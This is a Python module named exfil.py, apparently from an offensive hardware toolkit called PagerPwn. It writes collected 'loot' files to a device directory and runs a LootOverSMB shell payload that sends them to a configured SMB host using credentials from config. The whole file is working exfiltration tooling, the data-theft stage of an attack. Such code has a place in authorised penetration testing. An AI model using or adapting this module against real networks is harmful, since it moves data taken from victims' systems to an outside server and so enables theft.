"""
exfil.py - Loot writer and SMB exfil trigger for PagerPwn

Writes loot files to /mmc/root/loot/pagerpwn/ and optionally
triggers the LootOverSMB payload for sync to the home server.
Module interface: run(config, ui_callback, stop_event) -> bool
"""

import os
import json
import subprocess
from datetime import datetime

DEFAULT_LOOT_DIR = "/mmc/root/loot/pagerpwn"
LOOTOVERSMB_PATH = "/mmc/root/payloads/user/customs/LootOverSMB/payload.sh"


def ensure_dir(path):
    os.makedirs(path, exist_ok=True)


def timestamp_filename(prefix, ext):
    ts = datetime.now().strftime("%Y-%m-%d_%H%M%S")
    return f"{prefix}_{ts}.{ext}"


def write_loot(filename, content, loot_dir=DEFAULT_LOOT_DIR):
    """Append text content to a loot file. Returns full path."""
    ensure_dir(loot_dir)
    path = os.path.join(loot_dir, filename)
    with open(path, "a") as f:
        f.write(content)
        if not content.endswith("\n"):
            f.write("\n")
    return path


def write_json_loot(filename, data, loot_dir=DEFAULT_LOOT_DIR):
    """Write JSON loot (overwrites). Returns full path."""
    ensure_dir(loot_dir)
    path = os.path.join(loot_dir, filename)
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    return path


def list_loot_files(loot_dir=DEFAULT_LOOT_DIR):
    """Return sorted list of loot filenames."""
    if not os.path.isdir(loot_dir):
        return []
    return sorted(os.listdir(loot_dir))


def _trigger_loot_over_smb(config, ui_callback):
    if not config.get("SMB_HOST"):
        ui_callback("EXFIL", "SMB_HOST not set in config")
        return False

    if not os.path.exists(LOOTOVERSMB_PATH):
        ui_callback("EXFIL", "LootOverSMB not installed")
        return False

    env = os.environ.copy()
    env["SMB_USER"] = config.get("SMB_USER", "")
    env["SMB_PASS"] = config.get("SMB_PASS", "")
    env["SMB_HOST"] = config.get("SMB_HOST", "")
    env["SMB_SHARE"] = config.get("SMB_SHARE", "")

    ui_callback("EXFIL", "Syncing via SMB...")
    try:
        result = subprocess.run(
            ["sh", LOOTOVERSMB_PATH],
            env=env,
            capture_output=True,
            text=True,
            timeout=60,
        )
        success = result.returncode == 0
        ui_callback("EXFIL DONE" if success else "EXFIL FAILED",
                    "Sync OK" if success else result.stderr.strip()[:30])
        return success
    except subprocess.TimeoutExpired:
        ui_callback("EXFIL", "Timeout after 60s")
        return False
    except Exception as e:
        ui_callback("EXFIL ERROR", str(e)[:30])
        return False


def run(config, ui_callback, stop_event=None):
    """Trigger LootOverSMB exfil and report result."""
    loot_dir = config.get("LOOT_DIR", DEFAULT_LOOT_DIR)
    files = list_loot_files(loot_dir)
    ui_callback(f"LOOT: {len(files)} file(s)", "Starting SMB sync...")
    return _trigger_loot_over_smb(config, ui_callback)
